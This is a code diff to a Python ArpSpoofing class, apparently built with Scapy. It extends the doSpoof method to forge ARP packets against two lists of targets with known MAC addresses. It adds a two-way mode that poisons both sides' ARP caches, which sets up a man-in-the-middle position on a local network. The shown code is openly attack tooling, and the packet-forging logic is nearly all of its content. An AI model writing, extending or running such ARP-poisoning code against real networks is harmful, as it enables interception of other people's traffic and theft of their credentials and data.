@@ -8,7 +8,7 @@ class ArpSpoofing():
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doSpoof(self, hostToAttack, hostToSpoof, timeSleep):
+    def doSpoof(self, target1, target2, target1MAC, target2MAC, oneway, silent, timeSleep):
 
         #This method obtains your own mac address
         def obtainMac():
@@ -27,10 +27,18 @@ class ArpSpoofing():
 
         #Arp part of packet
         arpPartList = []
-        for ip in hostToAttack:
-            arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=ip)
-            arpPartList.append(arpPart)
-
+        if oneway == True:
+            for i in range(len(target1)):
+                for j in range(len(target2)):
+                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target2[j], hwdst=target1MAC[i], pdst=target1[i])
+                    arpPartList.append(arpPart)
+        elif oneway == False:
+            for i in range(len(target1)):
+                for j in range(len(target2)):
+                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target2[j], hwdst=target1MAC[i], pdst=target1[i])
+                    arpPartList.append(arpPart)
+                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target1[i], hwdst=target2MAC[j], pdst=target2[j])
+                    arpPartList.append(arpPart)
         #total packet
         packetList = []
         for part in arpPartList:
